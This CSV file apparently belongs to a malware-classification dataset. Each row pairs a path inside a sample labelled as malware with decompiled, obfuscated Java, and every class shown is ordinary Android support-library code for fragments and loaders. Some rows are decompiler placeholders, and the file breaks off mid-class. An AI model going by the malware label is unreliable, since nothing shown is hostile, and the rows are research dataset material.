"filepath","code"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.a\a.code","public class a<D> {   int a;   InterfaceC0000a<D> b;   boolean c;   boolean d;   boolean e;   boolean f; public interface InterfaceC0000a<D> {   }   public void a(  int i,  InterfaceC0000a<D> interfaceC0000a){     if (this.b != null) {       throw new IllegalStateException(""There is already a listener registered"");     }     this.b=interfaceC0000a;     this.a=i;   }   public void a(  InterfaceC0000a<D> interfaceC0000a){     if (this.b == null) {       throw new IllegalStateException(""No listener register"");     }     if (this.b != interfaceC0000a) {       throw new IllegalArgumentException(""Attempting to unregister the wrong listener"");     }     this.b=null;   }   public final void a(){     this.c=true;     this.e=false;     this.d=false;     b();   }   protected void b(){   }   public void c(){     this.c=false;     d();   }   protected void d(){   }   public void e(){     f();     this.e=true;     this.c=false;     this.d=false;     this.f=false;   }   protected void f(){   }   public String a(  D d){     StringBuilder sb=new StringBuilder(64);     android.support.v4.c.a.a(d,sb);     sb.append(""}"");     return sb.toString();   }   public String toString(){     StringBuilder sb=new StringBuilder(64);     android.support.v4.c.a.a(this,sb);     sb.append("" id="");     sb.append(this.a);     sb.append(""}"");     return sb.toString();   }   public void a(  String str,  FileDescriptor fileDescriptor,  PrintWriter printWriter,  String[] strArr){     printWriter.print(str);     printWriter.print(""mId="");     printWriter.print(this.a);     printWriter.print("" mListener="");     printWriter.println(this.b);     printWriter.print(str);     printWriter.print(""mStarted="");     printWriter.print(this.c);     printWriter.print("" mContentChanged="");     printWriter.print(this.f);     printWriter.print("" mAbandoned="");     printWriter.print(this.d);     printWriter.print("" mReset="");     printWriter.println(this.e);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.a\InterfaceC0000a.code","public interface InterfaceC0000a<D> { } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.app\a.code","class a {   public static void a(  Activity activity){     activity.invalidateOptionsMenu();   } } public static final class a {   a a;   a b;   int c;   Fragment d;   int e;   int f;   int g;   int h;   ArrayList<Fragment> i; } public interface a {   void a(); } public interface a<D> {   android.support.v4.a.a<D> a(  int i,  Bundle bundle);   void a(  android.support.v4.a.a<D> aVar);   void a(  android.support.v4.a.a<D> aVar,  D d); } public static class a extends RuntimeException {   public a(  String str,  Exception exc){     super(str,exc);   } } static class a {   public static final int Fragment_id=1;   public static final int Fragment_name=0;   public static final int Fragment_tag=2;   public static final int[] a={R.attr.name,R.attr.id,R.attr.tag}; } public final class a implements a.InterfaceC0000a<Object> {   final int a;   final Bundle b;   f.a<Object> c;   android.support.v4.a.a<Object> d;   boolean e;   boolean f;   Object g;   boolean h;   boolean i;   boolean j;   boolean k;   boolean l;   boolean m;   a n;   final g o;   void a(){     if (this.i && this.j) {       this.h=true;       return;     }     if (!this.h) {       this.h=true;       if (g.a) {         Log.v(g.TAG,""  Starting: "" + this);       }       if (this.d == null && this.c != null) {         this.d=this.c.a(this.a,this.b);       }       if (this.d != null) {         if (this.d.getClass().isMemberClass() && !Modifier.isStatic(this.d.getClass().getModifiers())) {           throw new IllegalArgumentException(""Object returned from onCreateLoader must not be a non-static inner member class: "" + this.d);         }         if (!this.m) {           this.d.a(this.a,this);           this.m=true;         }         this.d.a();       }     }   }   void b(){     if (g.a) {       Log.v(g.TAG,""  Retaining: "" + this);     }     this.i=true;     this.j=this.h;     this.h=false;     this.c=null;   }   void c(){     if (this.i) {       if (g.a) {         Log.v(g.TAG,""  Finished Retaining: "" + this);       }       this.i=false;       if (this.h != this.j && !this.h) {         e();       }     }     if (this.h && this.e && !this.k) {       a(this.d,this.g);     }   }   void d(){     if (this.h && this.k) {       this.k=false;       if (this.e) {         a(this.d,this.g);       }     }   }   void e(){     if (g.a) {       Log.v(g.TAG,""  Stopping: "" + this);     }     this.h=false;     if (!this.i && this.d != null && this.m) {       this.m=false;       this.d.a((a.InterfaceC0000a<Object>)this);       this.d.c();     }   }   void f(){     String str;     if (g.a) {       Log.v(g.TAG,""  Destroying: "" + this);     }     this.l=true;     boolean z=this.f;     this.f=false;     if (this.c != null && this.d != null && this.e && z) {       if (g.a) {         Log.v(g.TAG,""  Reseting: "" + this);       }       if (this.o.d != null) {         String str2=this.o.d.b.r;         this.o.d.b.r=""onLoaderReset"";         str=str2;       }  else {         str=null;       }       try {         this.c.a(this.d);       }   finally {         if (this.o.d != null) {           this.o.d.b.r=str;         }       }     }     this.c=null;     this.g=null;     this.e=false;     if (this.d != null) {       if (this.m) {         this.m=false;         this.d.a((a.InterfaceC0000a<Object>)this);       }       this.d.e();     }     if (this.n != null) {       this.n.f();     }   }   void a(  android.support.v4.a.a<Object> aVar,  Object obj){     String str;     if (this.c != null) {       if (this.o.d == null) {         str=null;       }  else {         String str2=this.o.d.b.r;         this.o.d.b.r=""onLoadFinished"";         str=str2;       }       try {         if (g.a) {           Log.v(g.TAG,""  onLoadFinished in "" + aVar + "": ""+ aVar.a((android.support.v4.a.a<Object>)obj));         }         this.c.a((android.support.v4.a.a<android.support.v4.a.a<Object>>)aVar,(android.support.v4.a.a<Object>)obj);         this.f=true;       }   finally {         if (this.o.d != null) {           this.o.d.b.r=str;         }       }     }   }   public String toString(){     StringBuilder sb=new StringBuilder(64);     sb.append(""LoaderInfo{"");     sb.append(Integer.toHexString(System.identityHashCode(this)));     sb.append("" #"");     sb.append(this.a);     sb.append("" : "");     android.support.v4.c.a.a(this.d,sb);     sb.append(""}}"");     return sb.toString();   }   public void a(  String str,  FileDescriptor fileDescriptor,  PrintWriter printWriter,  String[] strArr){     printWriter.print(str);     printWriter.print(""mId="");     printWriter.print(this.a);     printWriter.print("" mArgs="");     printWriter.println(this.b);     printWriter.print(str);     printWriter.print(""mCallbacks="");     printWriter.println(this.c);     printWriter.print(str);     printWriter.print(""mLoader="");     printWriter.println(this.d);     if (this.d != null) {       this.d.a(str + ""  "",fileDescriptor,printWriter,strArr);     }     if (this.e || this.f) {       printWriter.print(str);       printWriter.print(""mHaveData="");       printWriter.print(this.e);       printWriter.print(""  mDeliveredData="");       printWriter.println(this.f);       printWriter.print(str);       printWriter.print(""mData="");       printWriter.println(this.g);     }     printWriter.print(str);     printWriter.print(""mStarted="");     printWriter.print(this.h);     printWriter.print("" mReportNextStart="");     printWriter.print(this.k);     printWriter.print("" mDestroyed="");     printWriter.println(this.l);     printWriter.print(str);     printWriter.print(""mRetaining="");     printWriter.print(this.i);     printWriter.print("" mRetainingStarted="");     printWriter.print(this.j);     printWriter.print("" mListenerRegistered="");     printWriter.println(this.m);     if (this.n != null) {       printWriter.print(str);       printWriter.println(""Pending Loader "");       printWriter.print(this.n);       printWriter.println("":"");       this.n.a(str + ""  "",fileDescriptor,printWriter,strArr);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.app\b.code","!org.eclipse.jdt.core.dom.TypeDeclaration@29ad44e3static final class b {   Object a;   Object b;   HashMap<String,Object> c;   ArrayList<Fragment> d;   android.support.v4.c.c<g> e;   b(){   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.app\BackStackState.code","public final class BackStackState implements Parcelable {   public static final Parcelable.Creator<BackStackState> CREATOR=new Parcelable.Creator<BackStackState>(){     @Override public BackStackState createFromParcel(    Parcel parcel){       return new BackStackState(parcel);     }     @Override public BackStackState[] newArray(    int i){       return new BackStackState[i];     }   } ;   final int[] a;   final int b;   final int c;   final String d;   final int e;   final int f;   final CharSequence g;   final int h;   final CharSequence i;   public BackStackState(  d dVar,  b bVar){     int i=0;     for (b.a aVar=bVar.b; aVar != null; aVar=aVar.a) {       if (aVar.i != null) {         i+=aVar.i.size();       }     }     this.a=new int[i + (bVar.d * 7)];     if (!bVar.k) {       throw new IllegalStateException(""Not on back stack"");     }     int i2=0;     for (b.a aVar2=bVar.b; aVar2 != null; aVar2=aVar2.a) {       int i3=i2 + 1;       this.a[i2]=aVar2.c;       int i4=i3 + 1;       this.a[i3]=aVar2.d != null ? aVar2.d.f : -1;       int i5=i4 + 1;       this.a[i4]=aVar2.e;       int i6=i5 + 1;       this.a[i5]=aVar2.f;       int i7=i6 + 1;       this.a[i6]=aVar2.g;       int i8=i7 + 1;       this.a[i7]=aVar2.h;       if (aVar2.i != null) {         int size=aVar2.i.size();         int i9=i8 + 1;         this.a[i8]=size;         int i10=0;         while (i10 < size) {           this.a[i9]=aVar2.i.get(i10).f;           i10++;           i9++;         }         i2=i9;       }  else {         i2=i8 + 1;         this.a[i8]=0;       }     }     this.b=bVar.i;     this.c=bVar.j;     this.d=bVar.m;     this.e=bVar.o;     this.f=bVar.p;     this.g=bVar.q;     this.h=bVar.r;     this.i=bVar.s;   }   public BackStackState(  Parcel parcel){     this.a=parcel.createIntArray();     this.b=parcel.readInt();     this.c=parcel.readInt();     this.d=parcel.readString();     this.e=parcel.readInt();     this.f=parcel.readInt();     this.g=(CharSequence)TextUtils.CHAR_SEQUENCE_CREATOR.createFromParcel(parcel);     this.h=parcel.readInt();     this.i=(CharSequence)TextUtils.CHAR_SEQUENCE_CREATOR.createFromParcel(parcel);   }   public b a(  d dVar){     b bVar=new b(dVar);     int i=0;     while (i < this.a.length) {       b.a aVar=new b.a();       int i2=i + 1;       aVar.c=this.a[i];       if (d.a) {         Log.v(""FragmentManager"",""BSE "" + bVar + "" set base fragment #""+ this.a[i2]);       }       int i3=i2 + 1;       int i4=this.a[i2];       if (i4 >= 0) {         aVar.d=dVar.e.get(i4);       }  else {         aVar.d=null;       }       int i5=i3 + 1;       aVar.e=this.a[i3];       int i6=i5 + 1;       aVar.f=this.a[i5];       int i7=i6 + 1;       aVar.g=this.a[i6];       int i8=i7 + 1;       aVar.h=this.a[i7];       i=i8 + 1;       int i9=this.a[i8];       if (i9 > 0) {         aVar.i=new ArrayList<>(i9);         int i10=0;         while (i10 < i9) {           if (d.a) {             Log.v(""FragmentManager"",""BSE "" + bVar + "" set remove fragment #""+ this.a[i]);           }           aVar.i.add(dVar.e.get(this.a[i]));           i10++;           i++;         }       }       bVar.a(aVar);     }     bVar.i=this.b;     bVar.j=this.c;     bVar.m=this.d;     bVar.o=this.e;     bVar.k=true;     bVar.p=this.f;     bVar.q=this.g;     bVar.r=this.h;     bVar.s=this.i;     bVar.a(1);     return bVar;   }   @Override public int describeContents(){     return 0;   }   @Override public void writeToParcel(  Parcel parcel,  int i){     parcel.writeIntArray(this.a);     parcel.writeInt(this.b);     parcel.writeInt(this.c);     parcel.writeString(this.d);     parcel.writeInt(this.e);     parcel.writeInt(this.f);     TextUtils.writeToParcel(this.g,parcel,0);     parcel.writeInt(this.h);     TextUtils.writeToParcel(this.i,parcel,0);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.app\c.code","public abstract class c {   public static final int POP_BACK_STACK_INCLUSIVE=1; public interface a {     void a();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.app\d.code","!org.eclipse.jdt.core.dom.TypeDeclaration@5b251fb9"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.app\e.code","public abstract class e {   public static final int TRANSIT_ENTER_MASK=4096;   public static final int TRANSIT_EXIT_MASK=8192;   public static final int TRANSIT_FRAGMENT_CLOSE=8194;   public static final int TRANSIT_FRAGMENT_FADE=4099;   public static final int TRANSIT_FRAGMENT_OPEN=4097;   public static final int TRANSIT_NONE=0;   public static final int TRANSIT_UNSET=-1; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.app\f.code","public abstract class f { public interface a<D> {     android.support.v4.a.a<D> a(    int i,    Bundle bundle);     void a(    android.support.v4.a.a<D> aVar);     void a(    android.support.v4.a.a<D> aVar,    D d);   }   public boolean a(){     return false;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.app\Fragment.code","public class Fragment implements ComponentCallbacks, View.OnCreateContextMenuListener {   static final int ACTIVITY_CREATED=2;   static final int CREATED=1;   static final int INITIALIZING=0;   private static final HashMap<String,Class<?>> N=new HashMap<>();   static final int RESUMED=5;   static final int STARTED=4;   static final int STOPPED=3;   boolean A;   boolean B;   boolean D;   int E;   ViewGroup F;   View G;   View H;   boolean I;   g K;   boolean L;   boolean M;   View b;   int c;   Bundle d;   SparseArray<Parcelable> e;   String g;   Bundle h;   Fragment i;   int k;   boolean l;   boolean m;   boolean n;   boolean o;   boolean p;   boolean q;   int r;   d s;   FragmentActivity t;   int u;   int v;   String w;   boolean x;   boolean y;   boolean z;   int a=0;   int f=-1;   int j=-1;   boolean C=true;   boolean J=true; public static class SavedState implements Parcelable {     public static final Parcelable.Creator<SavedState> CREATOR=new Parcelable.Creator<SavedState>(){       @Override public SavedState createFromParcel(      Parcel parcel){         return new SavedState(parcel,null);       }       @Override public SavedState[] newArray(      int i){         return new SavedState[i];       }     } ;     final Bundle a;     SavedState(    Parcel parcel,    ClassLoader classLoader){       this.a=parcel.readBundle();       if (classLoader != null && this.a != null) {         this.a.setClassLoader(classLoader);       }     }     @Override public int describeContents(){       return 0;     }     @Override public void writeToParcel(    Parcel parcel,    int i){       parcel.writeBundle(this.a);     }   } public static class a extends RuntimeException {     public a(    String str,    Exception exc){       super(str,exc);     }   }   public static Fragment a(  Context context,  String str){     return a(context,str,(Bundle)null);   }   public static Fragment a(  Context context,  String str,  Bundle bundle){     try {       Class<?> cls=N.get(str);       if (cls == null) {         cls=context.getClassLoader().loadClass(str);         N.put(str,cls);       }       Fragment fragment=(Fragment)cls.newInstance();       if (bundle != null) {         bundle.setClassLoader(fragment.getClass().getClassLoader());         fragment.h=bundle;       }       return fragment;     }  catch (    ClassNotFoundException e) {       throw new a(""Unable to instantiate fragment "" + str + "": make sure class name exists, is public, and has an empty constructor that is public"",e);     } catch (    IllegalAccessException e2) {       throw new a(""Unable to instantiate fragment "" + str + "": make sure class name exists, is public, and has an empty constructor that is public"",e2);     } catch (    InstantiationException e3) {       throw new a(""Unable to instantiate fragment "" + str + "": make sure class name exists, is public, and has an empty constructor that is public"",e3);     }   }   public final void a(){     if (this.e != null) {       this.H.restoreHierarchyState(this.e);       this.e=null;     }   }   public final void a(  int i){     this.f=i;     this.g=""android:fragment:"" + this.f;   }   public final boolean b(){     return this.r > 0;   }   public final boolean equals(  Object obj){     return super.equals(obj);   }   public final int hashCode(){     return super.hashCode();   }   public String toString(){     StringBuilder sb=new StringBuilder(android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS);     android.support.v4.c.a.a(this,sb);     if (this.f >= 0) {       sb.append("" #"");       sb.append(this.f);     }     if (this.u != 0) {       sb.append("" id=0x"");       sb.append(Integer.toHexString(this.u));     }     if (this.w != null) {       sb.append("" "");       sb.append(this.w);     }     sb.append('}');     return sb.toString();   }   public final FragmentActivity c(){     return this.t;   }   public void a(  boolean z){   }   public void a(  int i,  int i2,  Intent intent){   }   public LayoutInflater a(  Bundle bundle){     return this.t.getLayoutInflater();   }   public void a(  Activity activity,  AttributeSet attributeSet,  Bundle bundle){     this.D=true;   }   public void a(  Activity activity){     this.D=true;   }   public Animation a(  int i,  boolean z,  int i2){     return null;   }   public void b(  Bundle bundle){     this.D=true;   }   public View a(  LayoutInflater layoutInflater,  ViewGroup viewGroup,  Bundle bundle){     return null;   }   public void a(  View view,  Bundle bundle){   }   public void c(  Bundle bundle){     this.D=true;   }   public void d(){     this.D=true;     if (!this.L) {       this.L=true;       if (!this.M) {         this.M=true;         this.K=this.t.a(this.f,this.L,false);       }       if (this.K != null) {         this.K.b();       }     }   }   public void e(){     this.D=true;   }   public void d(  Bundle bundle){   }   @Override public void onConfigurationChanged(  Configuration configuration){     this.D=true;   }   public void f(){     this.D=true;   }   public void g(){     this.D=true;   }   @Override public void onLowMemory(){     this.D=true;   }   public void h(){     this.D=true;   }   public void i(){     this.D=true;     if (!this.M) {       this.M=true;       this.K=this.t.a(this.f,this.L,false);     }     if (this.K != null) {       this.K.h();     }   }   public void j(){     this.f=-1;     this.g=null;     this.l=false;     this.m=false;     this.n=false;     this.o=false;     this.p=false;     this.q=false;     this.r=0;     this.s=null;     this.t=null;     this.u=0;     this.v=0;     this.w=null;     this.x=false;     this.y=false;     this.A=false;     this.K=null;     this.L=false;     this.M=false;   }   public void k(){     this.D=true;   }   public void a(  Menu menu,  MenuInflater menuInflater){   }   public void a(  Menu menu){   }   public void l(){   }   public boolean a(  MenuItem menuItem){     return false;   }   public void b(  Menu menu){   }   @Override public void onCreateContextMenu(  ContextMenu contextMenu,  View view,  ContextMenu.ContextMenuInfo contextMenuInfo){     c().onCreateContextMenu(contextMenu,view,contextMenuInfo);   }   public boolean b(  MenuItem menuItem){     return false;   }   public void a(  String str,  FileDescriptor fileDescriptor,  PrintWriter printWriter,  String[] strArr){     printWriter.print(str);     printWriter.print(""mFragmentId=#"");     printWriter.print(Integer.toHexString(this.u));     printWriter.print("" mContainerId=#"");     printWriter.print(Integer.toHexString(this.v));     printWriter.print("" mTag="");     printWriter.println(this.w);     printWriter.print(str);     printWriter.print(""mState="");     printWriter.print(this.a);     printWriter.print("" mIndex="");     printWriter.print(this.f);     printWriter.print("" mWho="");     printWriter.print(this.g);     printWriter.print("" mBackStackNesting="");     printWriter.println(this.r);     printWriter.print(str);     printWriter.print(""mAdded="");     printWriter.print(this.l);     printWriter.print("" mRemoving="");     printWriter.print(this.m);     printWriter.print("" mResumed="");     printWriter.print(this.n);     printWriter.print("" mFromLayout="");     printWriter.print(this.o);     printWriter.print("" mInLayout="");     printWriter.println(this.p);     printWriter.print(str);     printWriter.print(""mHidden="");     printWriter.print(this.x);     printWriter.print("" mDetached="");     printWriter.print(this.y);     printWriter.print("" mMenuVisible="");     printWriter.print(this.C);     printWriter.print("" mHasMenu="");     printWriter.println(this.B);     printWriter.print(str);     printWriter.print(""mRetainInstance="");     printWriter.print(this.z);     printWriter.print("" mRetaining="");     printWriter.print(this.A);     printWriter.print("" mUserVisibleHint="");     printWriter.println(this.J);     if (this.s != null) {       printWriter.print(str);       printWriter.print(""mFragmentManager="");       printWriter.println(this.s);     }     if (this.t != null) {       printWriter.print(str);       printWriter.print(""mActivity="");       printWriter.println(this.t);     }     if (this.h != null) {       printWriter.print(str);       printWriter.print(""mArguments="");       printWriter.println(this.h);     }     if (this.d != null) {       printWriter.print(str);       printWriter.print(""mSavedFragmentState="");       printWriter.println(this.d);     }     if (this.e != null) {       printWriter.print(str);       printWriter.print(""mSavedViewState="");       printWriter.println(this.e);     }     if (this.i != null) {       printWriter.print(str);       printWriter.print(""mTarget="");       printWriter.print(this.i);       printWriter.print("" mTargetRequestCode="");       printWriter.println(this.k);     }     if (this.E != 0) {       printWriter.print(str);       printWriter.print(""mNextAnim="");       printWriter.println(this.E);     }     if (this.F != null) {       printWriter.print(str);       printWriter.print(""mContainer="");       printWriter.println(this.F);     }     if (this.G != null) {       printWriter.print(str);       printWriter.print(""mView="");       printWriter.println(this.G);     }     if (this.H != null) {       printWriter.print(str);       printWriter.print(""mInnerView="");       printWriter.println(this.G);     }     if (this.b != null) {       printWriter.print(str);       printWriter.print(""mAnimatingAway="");       printWriter.println(this.b);       printWriter.print(str);       printWriter.print(""mStateAfterAnimating="");       printWriter.println(this.c);     }     if (this.K != null) {       printWriter.print(str);       printWriter.println(""Loader Manager:"");       this.K.a(str + ""  "",fileDescriptor,printWriter,strArr);     }   }   public void m(){     d();     if (this.K != null) {       this.K.g();     }   }   public void n(){     g();   }   public void o(){     if (this.L) {       this.L=false;       if (!this.M) {         this.M=true;         this.K=this.t.a(this.f,this.L,false);       }       if (this.K != null) {         if (!this.t.g) {           this.K.c();         }  else {           this.K.d();         }       }     }   }   public void p(){     h();     if (this.K != null) {       this.K.f();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.app\FragmentActivity.code","!org.eclipse.jdt.core.dom.TypeDeclaration@70169464"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.app\FragmentManagerState.code","public final class FragmentManagerState implements Parcelable {   public static final Parcelable.Creator<FragmentManagerState> CREATOR=new Parcelable.Creator<FragmentManagerState>(){     @Override public FragmentManagerState createFromParcel(    Parcel parcel){       return new FragmentManagerState(parcel);     }     @Override public FragmentManagerState[] newArray(    int i){       return new FragmentManagerState[i];     }   } ;   FragmentState[] a;   int[] b;   BackStackState[] c;   public FragmentManagerState(){   }   public FragmentManagerState(  Parcel parcel){     this.a=(FragmentState[])parcel.createTypedArray(FragmentState.CREATOR);     this.b=parcel.createIntArray();     this.c=(BackStackState[])parcel.createTypedArray(BackStackState.CREATOR);   }   @Override public int describeContents(){     return 0;   }   @Override public void writeToParcel(  Parcel parcel,  int i){     parcel.writeTypedArray(this.a,i);     parcel.writeIntArray(this.b);     parcel.writeTypedArray(this.c,i);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.app\FragmentState.code","public final class FragmentState implements Parcelable {   public static final Parcelable.Creator<FragmentState> CREATOR=new Parcelable.Creator<FragmentState>(){     @Override public FragmentState createFromParcel(    Parcel parcel){       return new FragmentState(parcel);     }     @Override public FragmentState[] newArray(    int i){       return new FragmentState[i];     }   } ;   final String a;   final int b;   final boolean c;   final int d;   final int e;   final String f;   final boolean g;   final boolean h;   final Bundle i;   Bundle j;   Fragment k;   public FragmentState(  Fragment fragment){     this.a=fragment.getClass().getName();     this.b=fragment.f;     this.c=fragment.o;     this.d=fragment.u;     this.e=fragment.v;     this.f=fragment.w;     this.g=fragment.z;     this.h=fragment.y;     this.i=fragment.h;   }   public FragmentState(  Parcel parcel){     this.a=parcel.readString();     this.b=parcel.readInt();     this.c=parcel.readInt() != 0;     this.d=parcel.readInt();     this.e=parcel.readInt();     this.f=parcel.readString();     this.g=parcel.readInt() != 0;     this.h=parcel.readInt() != 0;     this.i=parcel.readBundle();     this.j=parcel.readBundle();   }   public Fragment a(  FragmentActivity fragmentActivity){     if (this.k != null) {       return this.k;     }     if (this.i != null) {       this.i.setClassLoader(fragmentActivity.getClassLoader());     }     this.k=Fragment.a(fragmentActivity,this.a,this.i);     if (this.j != null) {       this.j.setClassLoader(fragmentActivity.getClassLoader());       this.k.d=this.j;     }     this.k.a(this.b);     this.k.o=this.c;     this.k.q=true;     this.k.u=this.d;     this.k.v=this.e;     this.k.w=this.f;     this.k.z=this.g;     this.k.y=this.h;     this.k.s=fragmentActivity.b;     if (d.a) {       Log.v(""FragmentManager"",""Instantiated fragment "" + this.k);     }     return this.k;   }   @Override public int describeContents(){     return 0;   }   @Override public void writeToParcel(  Parcel parcel,  int i){     parcel.writeString(this.a);     parcel.writeInt(this.b);     parcel.writeInt(this.c ? 1 : 0);     parcel.writeInt(this.d);     parcel.writeInt(this.e);     parcel.writeString(this.f);     parcel.writeInt(this.g ? 1 : 0);     parcel.writeInt(this.h ? 1 : 0);     parcel.writeBundle(this.i);     parcel.writeBundle(this.j);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.app\g.code","public class g extends f {   static final String TAG=""LoaderManager"";   static boolean a=false;   final android.support.v4.c.c<a> b=new android.support.v4.c.c<>();   final android.support.v4.c.c<a> c=new android.support.v4.c.c<>();   FragmentActivity d;   boolean e;   boolean f; public final class a implements a.InterfaceC0000a<Object> {     final int a;     final Bundle b;     f.a<Object> c;     android.support.v4.a.a<Object> d;     boolean e;     boolean f;     Object g;     boolean h;     boolean i;     boolean j;     boolean k;     boolean l;     boolean m;     a n;     final g o;     void a(){       if (this.i && this.j) {         this.h=true;         return;       }       if (!this.h) {         this.h=true;         if (g.a) {           Log.v(g.TAG,""  Starting: "" + this);         }         if (this.d == null && this.c != null) {           this.d=this.c.a(this.a,this.b);         }         if (this.d != null) {           if (this.d.getClass().isMemberClass() && !Modifier.isStatic(this.d.getClass().getModifiers())) {             throw new IllegalArgumentException(""Object returned from onCreateLoader must not be a non-static inner member class: "" + this.d);           }           if (!this.m) {             this.d.a(this.a,this);             this.m=true;           }           this.d.a();         }       }     }     void b(){       if (g.a) {         Log.v(g.TAG,""  Retaining: "" + this);       }       this.i=true;       this.j=this.h;       this.h=false;       this.c=null;     }     void c(){       if (this.i) {         if (g.a) {           Log.v(g.TAG,""  Finished Retaining: "" + this);         }         this.i=false;         if (this.h != this.j && !this.h) {           e();         }       }       if (this.h && this.e && !this.k) {         a(this.d,this.g);       }     }     void d(){       if (this.h && this.k) {         this.k=false;         if (this.e) {           a(this.d,this.g);         }       }     }     void e(){       if (g.a) {         Log.v(g.TAG,""  Stopping: "" + this);       }       this.h=false;       if (!this.i && this.d != null && this.m) {         this.m=false;         this.d.a((a.InterfaceC0000a<Object>)this);         this.d.c();       }     }     void f(){       String str;       if (g.a) {         Log.v(g.TAG,""  Destroying: "" + this);       }       this.l=true;       boolean z=this.f;       this.f=false;       if (this.c != null && this.d != null && this.e && z) {         if (g.a) {           Log.v(g.TAG,""  Reseting: "" + this);         }         if (this.o.d != null) {           String str2=this.o.d.b.r;           this.o.d.b.r=""onLoaderReset"";           str=str2;         }  else {           str=null;         }         try {           this.c.a(this.d);         }   finally {           if (this.o.d != null) {             this.o.d.b.r=str;           }         }       }       this.c=null;       this.g=null;       this.e=false;       if (this.d != null) {         if (this.m) {           this.m=false;           this.d.a((a.InterfaceC0000a<Object>)this);         }         this.d.e();       }       if (this.n != null) {         this.n.f();       }     }     void a(    android.support.v4.a.a<Object> aVar,    Object obj){       String str;       if (this.c != null) {         if (this.o.d == null) {           str=null;         }  else {           String str2=this.o.d.b.r;           this.o.d.b.r=""onLoadFinished"";           str=str2;         }         try {           if (g.a) {             Log.v(g.TAG,""  onLoadFinished in "" + aVar + "": ""+ aVar.a((android.support.v4.a.a<Object>)obj));           }           this.c.a((android.support.v4.a.a<android.support.v4.a.a<Object>>)aVar,(android.support.v4.a.a<Object>)obj);           this.f=true;         }   finally {           if (this.o.d != null) {             this.o.d.b.r=str;           }         }       }     }     public String toString(){       StringBuilder sb=new StringBuilder(64);       sb.append(""LoaderInfo{"");       sb.append(Integer.toHexString(System.identityHashCode(this)));       sb.append("" #"");       sb.append(this.a);       sb.append("" : "");       android.support.v4.c.a.a(this.d,sb);       sb.append(""}}"");       return sb.toString();     }     public void a(    String str,    FileDescriptor fileDescriptor,    PrintWriter printWriter,    String[] strArr){       printWriter.print(str);       printWriter.print(""mId="");       printWriter.print(this.a);       printWriter.print("" mArgs="");       printWriter.println(this.b);       printWriter.print(str);       printWriter.print(""mCallbacks="");       printWriter.println(this.c);       printWriter.print(str);       printWriter.print(""mLoader="");       printWriter.println(this.d);       if (this.d != null) {         this.d.a(str + ""  "",fileDescriptor,printWriter,strArr);       }       if (this.e || this.f) {         printWriter.print(str);         printWriter.print(""mHaveData="");         printWriter.print(this.e);         printWriter.print(""  mDeliveredData="");         printWriter.println(this.f);         printWriter.print(str);         printWriter.print(""mData="");         printWriter.println(this.g);       }       printWriter.print(str);       printWriter.print(""mStarted="");       printWriter.print(this.h);       printWriter.print("" mReportNextStart="");       printWriter.print(this.k);       printWriter.print("" mDestroyed="");       printWriter.println(this.l);       printWriter.print(str);       printWriter.print(""mRetaining="");       printWriter.print(this.i);       printWriter.print("" mRetainingStarted="");       printWriter.print(this.j);       printWriter.print("" mListenerRegistered="");       printWriter.println(this.m);       if (this.n != null) {         printWriter.print(str);         printWriter.println(""Pending Loader "");         printWriter.print(this.n);         printWriter.println("":"");         this.n.a(str + ""  "",fileDescriptor,printWriter,strArr);       }     }   }   public g(  FragmentActivity fragmentActivity,  boolean z){     this.d=fragmentActivity;     this.e=z;   }   public void a(  FragmentActivity fragmentActivity){     this.d=fragmentActivity;   }   public void b(){     if (a) {       Log.v(TAG,""Starting in "" + this);     }     if (this.e) {       RuntimeException runtimeException=new RuntimeException(""here"");       runtimeException.fillInStackTrace();       Log.w(TAG,""Called doStart when already started: "" + this,runtimeException);     }  else {       this.e=true;       for (int a2=this.b.a() - 1; a2 >= 0; a2--) {         this.b.f(a2).a();       }     }   }   public void c(){     if (a) {       Log.v(TAG,""Stopping in "" + this);     }     if (!this.e) {       RuntimeException runtimeException=new RuntimeException(""here"");       runtimeException.fillInStackTrace();       Log.w(TAG,""Called doStop when not started: "" + this,runtimeException);     }  else {       for (int a2=this.b.a() - 1; a2 >= 0; a2--) {         this.b.f(a2).e();       }       this.e=false;     }   }   public void d(){     if (a) {       Log.v(TAG,""Retaining in "" + this);     }     if (!this.e) {       RuntimeException runtimeException=new RuntimeException(""here"");       runtimeException.fillInStackTrace();       Log.w(TAG,""Called doRetain when not started: "" + this,runtimeException);     }  else {       this.f=true;       this.e=false;       for (int a2=this.b.a() - 1; a2 >= 0; a2--) {         this.b.f(a2).b();       }     }   }   public void e(){     if (this.f) {       if (a) {         Log.v(TAG,""Finished Retaining in "" + this);       }       this.f=false;       for (int a2=this.b.a() - 1; a2 >= 0; a2--) {         this.b.f(a2).c();       }     }   }   public void f(){     for (int a2=this.b.a() - 1; a2 >= 0; a2--) {       this.b.f(a2).k=true;     }   }  